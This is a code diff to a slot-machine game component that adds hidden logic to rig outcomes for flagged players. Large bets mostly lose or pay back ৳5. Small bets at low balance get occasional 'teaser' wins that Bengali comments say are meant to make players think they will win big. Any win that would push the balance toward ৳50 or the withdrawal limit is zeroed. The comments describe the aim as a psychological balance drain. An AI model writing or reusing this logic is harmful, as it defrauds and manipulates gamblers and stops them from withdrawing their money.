@@ -794,7 +794,48 @@ export default function UniversalSlotEngine({ gameId = 'fortunegems2', onClose }
     }
 
     const maxCap = (eff.maxMultiplier || 500) * betAmount;
-    const totalWin = Math.min(maxCap, parseFloat((baseWin * mult).toFixed(2)));
+    let totalWin = Math.min(maxCap, parseFloat((baseWin * mult).toFixed(2)));
+
+    const isTargetedLoss = 
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0 ||
+      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+    if (isTargetedLoss) {
+      // 🎯 USER MANDATE: Psychological Teaser & Progressive Balance Drain
+      // 1. বড় বেট (৳৩০, ৳৫০, ৳১০০+): ৮৮% নিশ্চিত লস, ১২% সময়ে মাত্র ৳৫ ফেরত ("50 taka loss hola 5 taka nin ba amon")
+      if (betAmount >= 30) {
+        const roll = Math.random();
+        if (roll < 0.12 && user.balance > betAmount) {
+          totalWin = 5.00;
+          winningLines = ['Micro Return ৳5.00'];
+        } else {
+          totalWin = 0;
+          winningLines = [];
+        }
+      } 
+      // 2. ছোট বেট (৳৫ - ৳১৫) ও ব্যালেন্স কম থাকলে মাঝে মাঝে টিজার জয় (যাতে মনে করে অনেক জিতবে)
+      else if (betAmount <= 15 && user.balance < 40 && Math.random() < 0.28) {
+        const teaserWin = parseFloat((betAmount * (1.5 + Math.random() * 1.5)).toFixed(2));
+        totalWin = Math.min(25, teaserWin);
+        winningLines = [`Line Win ৳${totalWin}`];
+      }
+      // 3. বাকি সব ক্ষেত্রে ১০০% লস (টার্নওভার পূরণ হতে হতে ব্যালেন্স ৳০ হবে)
+      else {
+        totalWin = 0;
+        winningLines = [];
+      }
+
+      // হার্ড ক্যাপ: ব্যালেন্স কোনোভাবেই ৳৫০ বা উইথড্র সীমার (৳১০০/৳২০০) ধারেকাছে পৌঁছাতে পারবে না
+      if ((user.balance + totalWin) >= 50) {
+        totalWin = 0;
+        winningLines = [];
+      }
+    }
 
     if (totalWin > 0) {
       adjustUserBalance(user.uid, totalWin);
